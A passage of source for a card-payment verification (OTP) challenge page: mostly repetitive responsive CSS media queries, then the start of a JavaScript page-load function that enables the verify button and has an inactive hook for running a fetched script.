@media screen and (min-height: 820px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 66%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 500px) {
	.cancelTxn-div-info-msg{
		height: 55%;
	}
	.challenge-info-header-h1{
		line-height: 30px;
	}
	.challenge-info-sub-header{
		line-height: 22px;
	}
	.header-zone{
		height: 4%;
		padding: 1% 7% 1% 7%;
	}
	.text_input{
		margin: 0px 0px 30px 0px;
		min-width: 205px;
	}
	.container-body-submit-elongated{
		margin: 0px auto 30px auto;
	}
	#verify-btn-elongated{
		height: 44px;
		min-width: 205px;
		font-size: 14px;
	}
	.container-body-submit-input-elongated{
		height: 44px;
	}
	.container-body-submit-elongated{
		height: 44px;
	}
	#resend-button{
		min-width: 205px;
		max-height: 44px;
		height: 44px;
		font-size: 14px;
	}
}
@media screen and (min-height: 600px) {
	.cancelTxn-div-msg{
		height: 80%;
	}
	.cancelTxn-div-info-msg{
		height: 60%;
	}
	.challenge-info-header-h1{
		line-height: 30px;
	}
	.challenge-info-sub-header{
		line-height: 30px;
	}
}
@media screen and (min-height: 700px) {
	.cancelTxn-div-info-msg{
		height: 70%;
	}
	.challenge-info-header-h1{
		line-height: 40px;
	}
	.challenge-info-sub-header{
		line-height: 30px;
	}
}
@media screen and (min-height: 800px) {
	.cancelTxn-div-info-msg{
		height: 75%;
	}
}
@media screen and (min-height: 900px) {
	.cancelTxn-div-msg{
		height: 85%;
	}
	.cancelTxn-div-info-msg{
		height: 80%;
	}
}
/*landing auth*/
@media screen and (max-width: 400px){
	.challenge-info-header-h1{
		font-size: 16px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 11px;
	}
	.challenge-info-sub-header{
		font-size: 13px;
	}
	#displayText,  #displayText1{
		font-size: 11px;
	}
	.hidetext-span{
		font-size: 10px;
	}
	.hidetext1-span{
		font-size: 10px;
	}
}
@media screen and (min-width: 401px) and (max-width: 600px){
	.challenge-info-header-h1{
		font-size: 16px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 12px;
	}
	.challenge-info-sub-header{
		font-size: 14px;
	}
	#displayText,  #displayText1{
		font-size: 12px;
	}
	.hidetext-span{
		font-size: 11px;
	}
	.hidetext1-span{
		font-size: 11px;
	}
}
@media screen and (min-width: 601px) and (max-width: 1000px){
	.challenge-info-header-h1{
		font-size: 17px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 13px;
	}
	.challenge-info-sub-header{
		font-size: 15px;
	}
	#displayText,  #displayText1{
		font-size: 13px;
	}
	.hidetext-span{
		font-size: 11px;
	}
	.hidetext1-span{
		font-size: 13px;
	}
}
@media screen and (min-width: 1001px){
	.challenge-info-header-h1{
		font-size: 19px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 15px;
	}
	.challenge-info-sub-header{
		font-size: 17px;
	}
	#displayText,  #displayText1{
		font-size: 15px;
	}
	.hidetext-span{
		font-size: 14px;
	}
	.hidetext1-span{
		font-size: 14px;
	}
}
@media screen and (min-height: 500px){
	.challenge-info-header-h1{
		line-height: 30px;
	}
	.challenge-info-sub-header{
		line-height: 22px;
	}
	.header-zone{
		height: 4%;
		padding: 1% 7% 1% 7%;
	}
	.bb_label{
		font-size: 15px;
	}
}
@media screen and (min-height: 600px){
	.challenge-info-header-h1{
		line-height: 35px;
	}
	.challenge-info-sub-header{
		line-height: 30px;
	}
	.bb_label{
		font-size: 15px;
	}
}
@media screen and (min-height: 700px){
	.challenge-info-header-h1{
		line-height: 40px;
	}
	.challenge-info-sub-header{
		line-height: 30px;
	}
}
@media screen and (min-width: 340px){
	.lang-section select, .lang-section select option, .secondary-btn a{
		font-size: 12px;
	}
	.authentication-confirmation{
		height: 40%;
	}
	.container-body-ChannelSelect{
		width: 300px;
	}
	.container-body-Channel-enclose {
		margin: 0 37.5px;
	}
	.container-body-Channel-a{
		line-height: 1.5;
		font-size: 11px;
	}
	.cancelTxn-div{
		height: auto;
		width: 60%;
	}
	.cancelTxn-div h3{
		font-size: 15px;
	}
	.cancelTxn-div p{
		font-size: 11px;
	}
	.cancelTxn-input-btn, .cancelTxn-submit{
		max-width: 160px;
		font-size: 10px;
	}
}
@media screen and (min-width: 400px) and (min-height: 400px){
	.container-body-Channel-enclose{
		margin: 0 45px;
		height: 85px;
    	width: 85px;
	}
	.container-body-Channel{
		height: 80px;
    	width: 80px;
	}
	.container-body-ChannelSelect{
		width: 350px;
	}
}
@media screen and (min-width: 400px){
	/* .card-brand-logo {
    	padding: 1.5% 0 1.5% 5%;
	} */
	.header-zone{
		width: 90%;
    	padding: 0.5% 5% 0.5% 5%;
	}
	.branding-zone{
		width: 90%;
    	padding: 1% 5% 0.5% 5%;
	}
	.challenge-zone{
		width: 90%;
    	padding: 1% 5% 1% 5%;
	}
	.container-footer{
		width: 90%;
    	padding: 1% 5% 1% 5%;
	}
	.challenge-info-sub-header{
		padding: 2% 2% 0% 2%;
	}
}
@media screen and (min-width: 485px){
	/* .card-brand-logo {
    	padding: 1.5% 0 1.5% 5%;
	} */
	.header-zone{
		width: 92%;
    	padding: 0.5% 4% 0.5% 4%;
	}
	.branding-zone{
		width: 92%;
    	padding: 1% 4% 0.5% 4%;
	}
	.challenge-zone{
		width: 92%;
    	padding: 1% 4% 1% 4%;
	}
	.container-footer{
		width: 92%;
    	padding: 1% 4% 1% 4%;
	}
	.challenge-info-label {
		font-size: 14px;
		line-height: 17px;
	}
}
@media screen and (min-width: 600px){
	.lang-section select, .lang-section select option, .secondary-btn a{
		font-size: 13px;
	}
	/* .card-brand-logo {
    	padding: 1% 0 1% 5%;
	} */
	.cancelTxn-div{
		height: auto;
		width: 50%;
	}
	.cancelTxn-div h3{
		font-size: 17px;
	}
	.cancelTxn-div p{
		font-size: 13px;
	}
	.cancelTxn-input-btn, .cancelTxn-submit{
		max-width: 200px;
		font-size: 13px;
	}
	.challenge-info-label {
		font-size: 13px;
		line-height: 18px;
	}
	.bb_label{
		font-size: 15px;
	}
}
@media screen and (min-width: 1000px){
	/* .card-brand-logo {
    	padding: 0.5% 0 0.5% 5%;
	} */
	.cancelTxn-div{
		height: auto;
		width: 40%;
	}
}
@media screen and (min-height: 600px){
	.container-footer{
		min-height: 11%;
	}
}
@media screen and (min-width: 285px) and (min-height: 400px){
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-width: 350px) and (min-height: 400px){
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-width: 410px) and (min-height: 400px){
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-width: 470px) and (min-height: 400px){
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-width: 530px) and (min-height: 400px){
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-width: 595px) and (min-height: 400px){
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-width: 300px) and (min-height: 500px){
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-width: 440px) and (min-height: 500px){
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-width: 520px) and (min-height: 500px){
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-width: 250px) and (min-height: 600px){
	.challenge-zone{
		min-height: 71%;
	}
}
@media screen and (min-width: 300px) and (min-height: 600px){
	.challenge-zone{
		min-height: 70%;
	}
}
@media screen and (min-width: 380px) and (min-height: 600px){
	.challenge-zone{
		min-height: 69%;
	}
}
@media screen and (min-width: 490px) and (min-height: 600px){
	.challenge-zone{
		min-height: 69%;
	}
}
@media screen and (min-width: 535px) and (min-height: 600px){
	.challenge-zone{
		min-height: 68%;
	}
}
@media screen and (min-width: 675px) {
	.challenge-zone{
		min-height: 58%;
	}
	.challenge-info-header-h1{
		padding: 1%;
	}
	.container-body-ChannelSelect{
		width: 500px;
	}
	.container-body-Channel-enclose {
		height: 95px;
    	width: 95px;
		margin: 0 75px;
	}
	.container-body-Channel{
		height: 90px;
    	width: 90px;
	}
	.container-body-Channel-a{
		font-size: 12px;
		line-height: 1.5;
	}
	/* .container-body-ChannelSelect{
		width: 400px;
	}
	.container-body-Channel-enclose {
		height: 85px;
    	width: 85px;
		margin: 0 57.5px;
	}
	.container-body-Channel{
		height: 80px;
    	width: 80px;
	}
	.container-body-Channel-a{
		font-size: 11px;
		line-height: 1.5;
	} */
	/* .container-body-Channel-enclose{
		margin-left: 21%;
	} */
}
@media screen and (min-width: 735px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-width: 800px) {
	.challenge-zone{
		min-height: 56%;
	}
	/* .container-body-Channel-enclose{
		margin-left: 22%;
	} */
	.container-body-ChannelSelect{
		width: 500px;
	}
	.container-body-Channel-enclose {
		height: 95px;
    	width: 95px;
		margin: 0 75px;
	}
	.container-body-Channel{
		height: 90px;
    	width: 90px;
	}
	.container-body-Channel-a{
		font-size: 12px;
		line-height: 1.5;
	}
}
@media screen and (min-width: 860px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-width: 920px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-width: 990px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-width: 1050px) {
	.challenge-zone{
		min-height: 52%;
	}
	/* .container-body-Channel-enclose{
		margin-left: 23%;
	} */
}
@media screen and (min-width: 1115px) {
	.challenge-zone{
		min-height: 51%;
	}
	.challenge-info-text{
		padding: 1% 2%;
	}
}
@media screen and (min-width: 1180px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-width: 1240px) {
	.challenge-zone{
		min-height: 49%;
	}
	/* .container-body-Channel-enclose{
		margin-left: 24%;
	} */
}
@media screen and (min-width: 1300px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-width: 1370px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-width: 1430px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-width: 1495px) {
	.challenge-zone{
		min-height: 45%;
	}
	.challenge-info-text{
		padding: 1% 2%;
	}
	/* .container-body-Channel-enclose{
		margin-left: 25%;
	} */
}
@media screen and (min-width: 1560px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-width: 1620px) {
	.challenge-zone{
		min-height: 43%;
	}
}
@media screen and (min-width: 1685px) {
	.challenge-zone{
		min-height: 42%;
	}
}
@media screen and (min-width: 1750px) {
	.challenge-zone{
		min-height: 41%;
	}
}
@media screen and (min-width: 1810px) {
	.challenge-zone{
		min-height: 40%;
	}
}
@media screen and (min-width: 1870px) {
	.challenge-zone{
		min-height: 39%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 43%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 42%;
	}
}
@media screen and (min-height: 500px){
	.challenge-info-header-h1{
		font-size: 18px;
	}
	.challenge-info-sub-header{
		font-size: 15px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span {
		font-size: 13px;
		line-height: 20px;
	}
	#displayText,  #displayText1{
		font-size: 13px;
	}
}
@media screen and (min-height: 500px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 43%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 68%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 67%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 66%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 68%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 68%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 67%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 66%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 820px) and  (max-width: 610px) {
	.challenge-zone{
		min-height: 70%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 69%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 69%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 68%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 68%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 67%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 66%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 66%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 66%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 1025px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 500px) {
	.cancelTxn-div-info-msg{
		height: 55%;
	}
}
@media screen and (min-height: 600px) {
	.cancelTxn-div-msg{
		height: 80%;
	}
	.cancelTxn-div-info-msg{
		height: 60%;
	}
}
@media screen and (min-height: 700px) {
	.cancelTxn-div-info-msg{
		height: 70%;
	}
}
@media screen and (min-height: 800px) {
	.cancelTxn-div-info-msg{
		height: 75%;
	}
}
@media screen and (min-height: 900px) {
	.cancelTxn-div-msg{
		height: 85%;
	}
	.cancelTxn-div-info-msg{
		height: 80%;
	}
}
/*landing auth end*/
</style>

<script type="text/javascript">
	function onBodyLoad(){
		var selections = document.getElementsByClassName("container-body-txnInput")[0];
		if(selections){
			var inputTags = selections.getElementsByTagName('input');
			var count=0; var checkboxFlag=false; var radioFlag=false;
			for (i = 0; i < inputTags.length; i++) {
				if (inputTags[i].type == "checkbox") {
					if(inputTags[i].checked){
						count++;
					}
					checkboxFlag=true;
				}
				else if(inputTags[i].type == "radio" && inputTags[i].checked){
					document.getElementById("verify-button").disabled = false;
					document.getElementById("verify-button").style.background = "#46749e";
					radioFlag=true;
				} 
			}
		}
		if (radioFlag == true){
				document.getElementById("verify-button").disabled = false;
				document.getElementById("verify-button").style.background = "#46749e";
		}	
		else if(checkboxFlag==true){
			if(count > 0){
				document.getElementById("verify-button").disabled = false;
				document.getElementById("verify-button").style.background = "#46749e";
				//document.getElementById("displayAsSelect").value = count +" Selected";
			}
		}
		if (checkboxFlag == true){
			activateNextButton('checkbox');
		}
		else{
			activateNextButton('radio');
		}
		if(navigator.appVersion.indexOf("Edge") != -1 && document.getElementsByClassName("text_input")){
			document.getElementsByClassName("text_input")[0].style.fontSize="10px";
			document.getElementsByClassName("text_input")[0].style.lineHeight ="24px";
			document.getElementsByClassName("text_input")[1].style.fontSize="10px";
			document.getElementsByClassName("text_input")[1].style.lineHeight ="24px";
		}
		placeHolderText();
		var executionCapPage = null;
		window.otpElement = document.getElementById("text-input");
		window.sharedSecretElement = document.getElementById("text_input_shared_secret");
		window.bbElement = document.getElementById("bb_text_input");
		window.URL = null;
		window.form = document.forms['verify_form'];
		
		var bbExecuteFunction = null;
		console.log("Fetched script "+bbExecuteFunction);
		
		if((URL !== null) && ((executionCapPage === "OTP" && otpElement != null) || 
		   (executionCapPage === "SHARED_SECRET" && sharedSecretElement != null) || 
		   ((executionCapPage === "OTP_SHARED_SECRET" || executionCapPage === "CUSTOM") && (sharedSecretElement != null || otpElement != null)))){
				try{
					console.log("Executing try bbExecuteFunction");
					new Function(bbExecuteFunction)();
				}
				catch(err){
					console.log(err.message);
				}
		}
		console.log("js continuing");
	}
	function openChannelSelection() {
		document.getElementById('loader').style.display = 'block';
		document.getElementById('resend_form').style.display='block';
		document.getElementById('verify_form').style.display='none';
		document.getElementById('resend-info').style.display='block';
